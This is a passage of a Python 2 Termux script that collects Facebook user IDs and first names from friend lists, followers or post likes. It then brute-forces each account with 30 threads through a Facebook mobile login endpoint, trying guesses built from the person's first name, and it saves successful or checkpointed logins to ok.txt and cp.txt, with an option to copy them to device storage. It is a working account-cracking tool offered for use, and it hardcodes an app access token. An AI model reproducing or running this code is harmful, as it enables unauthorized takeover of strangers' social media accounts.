		print("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m firstname1234")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			randm()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname786")
		print("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m firstname1234")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			randm()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname786")
		print("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m firstname1234")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
		        randm()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		randmm2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m Random 5 Choice Password \033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[✓]\033[1;95m To Stop Process Press CTRL Then Press z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"1234"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[✓]\033[1;92m Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
def contact():
    os.system("clear")
    print logo
    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;93mFacebook")
    time.slep(0.05)
    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;93mInstagrame")
    time.slep(0.05)
    print("\033[1;97m[3]\033[1;91m-⋄-\033[1;93mYoutube")
    time.slep(0.05)
    print("\033[1;97m--------------------------------------------------")
    contact_info()
def contact_info():
    info = raw_input("\n╰─➣ ")
    if info =="1":
        os.system("xdg-open https://facebook.com/Techabm")
    elif info =="2":
        os.system("xdg-open https://instagrame.com/techabm")
    elif info =="3":
        os.system("xdg-open https://www.youtube.com/channel/UCA5fAtbE0Z0WNYaLfHrBJUA")
    else:
        print("[!] Please Select Valid Option")
        contact_info()
	
if __name__ == '__main__':
    tech_abm()        
#### Coded Bye ab(Arbab) m(Memon)
